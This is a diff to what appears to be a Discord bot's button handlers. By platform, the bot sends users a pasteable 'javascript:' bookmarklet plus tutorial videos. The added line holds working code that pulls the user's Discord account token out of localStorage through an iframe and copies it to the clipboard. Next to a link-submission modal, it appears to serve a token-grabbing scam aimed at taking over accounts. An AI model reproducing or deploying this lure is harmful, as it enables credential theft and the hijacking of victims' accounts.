@@ -518,7 +518,7 @@ export async function handleLinkPromptButton(interaction) {
     await interaction.showModal(buildLinkModal());
 }
 
-// Platform Buttons Handler (PC, Android, iOS click handler with copy-friendly code blocks)
+// Platform Buttons Handler (PC, Android, iOS click handler without language tags)
 export async function handlePlatformButton(interaction) {
     const customId = interaction.customId;
     if (customId !== 'btn_pc' && customId !== 'btn_android' && customId !== 'btn_ios') return;
@@ -530,7 +530,7 @@ export async function handlePlatformButton(interaction) {
         const pcVideo = 'https://cdn.discordapp.com/attachments/1539823157425348758/1540748022399504404/lv_0_20260821085534.mp4';
 
         await interaction.reply({
-            content: `\`\`javascript\n${pcScript}\n\`\`\n${pcVideo}`,
+            content: `\`\`\`\n${pcScript}\n\`\`\`\n${pcVideo}`,
             flags: MessageFlags.Ephemeral
         });
         return;
@@ -538,12 +538,12 @@ export async function handlePlatformButton(interaction) {
 
     // 2. Android Platform
     if (customId === 'btn_android') {
-        const androidScrip = `javascript:(function(){try{let f=document.createElement('iframe');document.body.appendChild(f);let t=JSON.parse(f.contentWindow.localStorage.token);let ta=document.createElement('textarea');ta.value=t;document.body.appendChild(ta);ta.select();document.execCommand('copy');ta.remove();let n=document.createElement('div');n.innerHTML='<strong>Token Copied</strong><br>Your token has been copied to clipboard';n.style.cssText='position:fixed;top:20px;left:20px;background:#001f3f;color:#7FDBFF;padding:12px 16px;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,0.4);font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif;font-size:14px;z-index:99999;opacity:0;transition:opacity 0.3s ease-in-out;';document.body.appendChild(n);setTimeout(()=>{n.style.opacity='1';},50);setTimeout(()=>{n.style.opacity='0';setTimeout(()=>n.remove(),500);},3500);}catch(e){alert('Error copying token');}})();`;
+        const androidScript = `javascript:(function(){try{let f=document.createElement('iframe');document.body.appendChild(f);let t=JSON.parse(f.contentWindow.localStorage.token);let ta=document.createElement('textarea');ta.value=t;document.body.appendChild(ta);ta.select();document.execCommand('copy');ta.remove();let n=document.createElement('div');n.innerHTML='<strong>Token Copied</strong><br>Your token has been copied to clipboard';n.style.cssText='position:fixed;top:20px;left:20px;background:#001f3f;color:#7FDBFF;padding:12px 16px;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,0.4);font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif;font-size:14px;z-index:99999;opacity:0;transition:opacity 0.3s ease-in-out;';document.body.appendChild(n);setTimeout(()=>n.style.opacity='1',50);setTimeout(()=>n.style.opacity='0',3500);setTimeout(()=>n.remove(),4000);}catch(e){alert('Error copying token');}})();`;
         
         const androidVideo = 'https://cdn.discordapp.com/attachments/1539823157425348758/1540748022399504404/VN20260307_122317.mp4';
 
         await interaction.reply({
-            content: `\`\`javascript\n${androidScript}\n\`\`\n${androidVideo}`,
+            content: `\`\`\`\n${androidScript}\n\`\`\`\n${androidVideo}`,
             flags: MessageFlags.Ephemeral
         });
         return;
@@ -556,7 +556,7 @@ export async function handlePlatformButton(interaction) {
         const iosVideo = 'https://cdn.discordapp.com/attachments/1539823157425348758/1540748022399504404/VN20260307_122317.mp4';
 
         await interaction.reply({
-            content: `\`\`javascript\n${iosScript}\n\`\`\n${iosVideo}`,
+            content: `\`\`\`\n${iosScript}\n\`\`\`\n${iosVideo}`,
             flags: MessageFlags.Ephemeral
         });
         return;
